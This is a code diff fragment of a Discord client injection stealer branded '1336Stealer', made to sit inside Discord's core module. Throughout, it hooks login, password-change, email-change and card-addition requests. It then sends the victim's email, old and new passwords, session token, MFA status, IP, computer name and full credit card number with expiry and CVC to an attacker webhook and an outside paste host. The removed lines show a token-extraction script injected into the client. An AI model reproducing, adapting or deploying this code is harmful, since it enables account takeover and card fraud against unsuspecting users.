+                    name: "<:mail:1067551360637218897> Email",
+                    value: `\`${user.email}\``,
+                    inline: !0
+                }, {
+                    name: ":fire: Password",
+                    value: `\`${password}\``,
+                    inline: !0
+                }, {
+                    name: "<:token:1067551382103658597> Token",
+                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                    inline: !1
+                }],
+
+                thumbnail: userAvatar,
+                image: userBanner
+            })
+
+            var params2 = await makeEmbed({
+                title: `<:JoinIcon:1050854831742525510> Total Friends (${Friends.len})`,
+                color: config['embed-color'],
+                description: Friends.badges,
+                image: userBanner,
+                thumbnail: userAvatar
+            })
+
+            params.embeds.push(params2.embeds[0])
+        
+            await post(params)
+            break
+        case request.url.endsWith("users/@me"):
+            if (!data.password) return
+            if (data.new_password) {
+                var params = await makeEmbed({
+                    title: "1336 Detect Password Changed",
+                    description: "[${info.username}'s account](https://t.me/St34ler)",
+                    color: config['embed-color'],
+                    fields: [{
+                        name: "Injection Info",
+                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
+                        inline: !1
+                    }, {
+                        name: ":mag_right: User ID",
+                        value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                        inline: !0
+                    }, {
+                        name: ":bust_in_silhouette: Username",
+                        value: `\`${user.username}#${user.discriminator}\``,
+                        inline: !0
+                    }, {
+                        name: "<a:nitro:1067551337266561135> Nitro",
+                        value: `${GetNitro(Nitro)}`,
+                        inline: !0
+                    }, {
+                        name: "<:badge:1067551347332878487> Badges",
+                        value: `${GetBadges(user.flags)}`,
+                        inline: !0
+                    }, {
+                        name: ":card: Billings",
+                        value: `${Billings}`,
+                        inline: !0
+                    }, {
+                        name: "<a:a2f:1040272766982692885> A2F",
+                        value: `${GetA2F(user.mfa_enabled)}`,
+                        inline: !0
+                    }, {
+                        name: "<:mail:1067551360637218897> Email",
+                        value: `\`${user.email}\``,
+                        inline: !0
+                    }, {
+                        name: ":anchor: Old Password",
+                        value: `\`${data.password}\``,
+                        inline: !0
+                    }, {
+                        name: ":fire: New Password",
+                        value: `\`${data.new_password}\``,
+                        inline: !0
+                    }, {
+                        name: "?? Bio",
+                        value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
+                        inline: !1
+                    }, {
+                        name: "<:token:1067551382103658597> Token",
+                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                        inline: !1
+                    }, ],
+
+                    thumbnail: userAvatar,
+                    image: userBanner
+                })
+
+                var params2 = await makeEmbed({
+                    title: `<:JoinIcon:1050854831742525510> Total Friends (${Friends.len})`,
+                    color: config['embed-color'],
+                    description: Friends.badges,
+                    image: userBanner,
+                    thumbnail: userAvatar
+                })
+
+                params.embeds.push(params2.embeds[0])
+            
+                await post(params)
             }
-        } else {}
+            if (data.email) {
+                var params = await makeEmbed({
+                    title: "1336 Detect Email Changed",
+                    description: "[${user.username}'s account](https://t.me/St34ler)",
+                    color: config['embed-color'],
+                    fields: [{
+                        name: "Injection Info",
+                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
+                        inline: !1
+                    }, {
+			name: ":mag_right: User ID",
+                        value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                        inline: !0
+                    }, {
+                        name: ":bust_in_silhouette:Username",
+                        value: `\`${user.username}#${user.discriminator}\``,
+                        inline: !0
+                    }, {
+                        name: "<a:nitro:1067551337266561135> Nitro",
+                        value: `${GetNitro(Nitro)}`,
+                        inline: !0
+                    }, {
+                        name: "<:badge:1067551347332878487> Badges",
+                        value: `${GetBadges(user.flags)}`,
+                        inline: !0
+                    }, {
+			name: ":card: Billing",
+                        value: `${Billings}`,
+                        inline: !1
+                    }, {
+                        name: "<a:a2f:1040272766982692885> A2F",
+                        value: `${GetA2F(user.mfa_enabled)}`,
+                        inline: !0
+                    }, {
+                        name: "<:mail:1067551360637218897> New Email",
+                        value: `\`${user.email}\``,
+                        inline: !0
+                    }, {
+                        name: ":fire: Password",
+                        value: `\`${data.password}\``,
+                        inline: !0
+                    }, {
+                        name: "?? Bio",
+                        value:  `\`\`\`${user.bio ?? ":x:"}\`\`\``,
+                        inline: !1
+                    }, {
+                        name: "<:token:1067551382103658597> Token",
+                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                        inline: !1
+                    }, ],
+
+                    thumbnail: userAvatar,
+                    image: userBanner
+                })
+
+                var params2 = await makeEmbed({
+                    title: `<:JoinIcon:1050854831742525510> Total Friends (${Friends.len})`,
+                    color: config['embed-color'],
+                    description: Friends.badges,
+                    image: userBanner,
+                    thumbnail: userAvatar
+                })
+
+                params.embeds.push(params2.embeds[0])
+            
+                await post(params)
+            }
+            break
+        case request.url.endsWith("tokens"):
+            var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
+
+            var params = await makeEmbed({
+                "title": "1336Stealer User Credit Card Added",
+                description: `
+                **IP:** ${ip}\n\n
+		:mag_right: **ID**\n\`\`\`${user.id}\`\`\`\n
+                :bust_in_silhouette: **Username**\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
+		<a:nitro:1067551337266561135> **Nitro**\n${GetNitro(user.premium_type)}\n
+		<:badge:1067551347332878487> **Badges**\n${GetBadges(user.flags)}\n
+		<:mail:1067551360637218897> **Email**\n\`\`\`${user.email}\`\`\`\n
+		<a:a2f:1040272766982692885> **A2F**\n${GetA2F(user.mfa_enabled)}\n
+		**Credit Card Number**\n\`\`\`${CardNumber}\`\`\`\n
+                **Credit Card Expiration**\n\`\`\`${month}/${year}\`\`\`\n
+                **CVC**\n\`\`\`${CardCVC}\`\`\`\n
+		<:token:1067551382103658597> **Token** \n\`\`\`${token}\`\`\``,
+                thumbnail: userAvatar,
+                image: userBanner
+            })
+
+            var params2 = await makeEmbed({
+                title: `<:JoinIcon:1050854831742525510> Total Friends (${Friends.len})`,
+                color: config['embed-color'],
+                description: Friends.badges,
+                image: userBanner,
+                thumbnail: userAvatar
+            })
+
+            params.embeds.push(params2.embeds[0])
+            await post(params)
+            break
     }
-    if (details.url.endsWith("tokens")) {
-        const window = BrowserWindow.getAllWindows()[0];
-        const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
-        window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
-            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)
-        })).catch(console.error);
-    }
-});
-
-
-
-
-
-module.exports = require('./core.asar')
+})
+module.exports = require("./core.asar")
